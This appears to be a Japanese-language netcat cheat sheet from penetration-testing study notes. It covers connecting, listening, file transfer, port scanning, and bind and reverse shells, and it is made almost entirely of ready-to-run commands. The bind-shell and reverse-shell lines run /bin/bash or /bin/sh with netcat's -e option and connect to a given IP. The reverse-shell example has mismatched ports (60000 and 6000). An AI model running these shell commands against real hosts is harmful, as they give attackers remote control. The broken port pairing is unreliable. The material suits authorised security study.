# netcat

### クライアントモード

```
nc -nv 10.11.0.22 110
```

* -nオプション：DNS の名前解決をスキップする
* -vオプション：いくつかの冗長性を追加する 



### サーバーモード

```
nc -nlvp 4444
```

* -lオプション：リスナーを作成
* -pオプション：リスニングポート番号を指定



### ファイル転送

```bash
# reciever
nc -nlvp 4444 > incoming.exe
```

```bash
# sender
nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
```



### ポートスキャン

```bash
# TCP
nc -nvv -w 1 -z 10.11.1.220 3388-3390

# UDP
nc -nv -u -z -w 1 10.11.1.115 160-162
```

* -z : zero-I/O mode [used for scanning]
* -w secs : timeout for connects and final net reads



### バインドシェル

```bash
#　待ち受け
nc -lvnp 4444 -e /bin/bash

# 接続
nc -nv xxx.xxx.xxx.xxx 4444
```

* -vオプション：詳細出力を指定

* -eオプション：-e programで利用。接続の受け入れまたは実行後に外部プログラムを実行する

* バインドシェルはfirewallではじかれることが多い。



### リバースシェル

```bash
# sender
nc -nv 192.168.119.175 60000 -e /bin/sh

# listener
nc -lvnp 6000
```

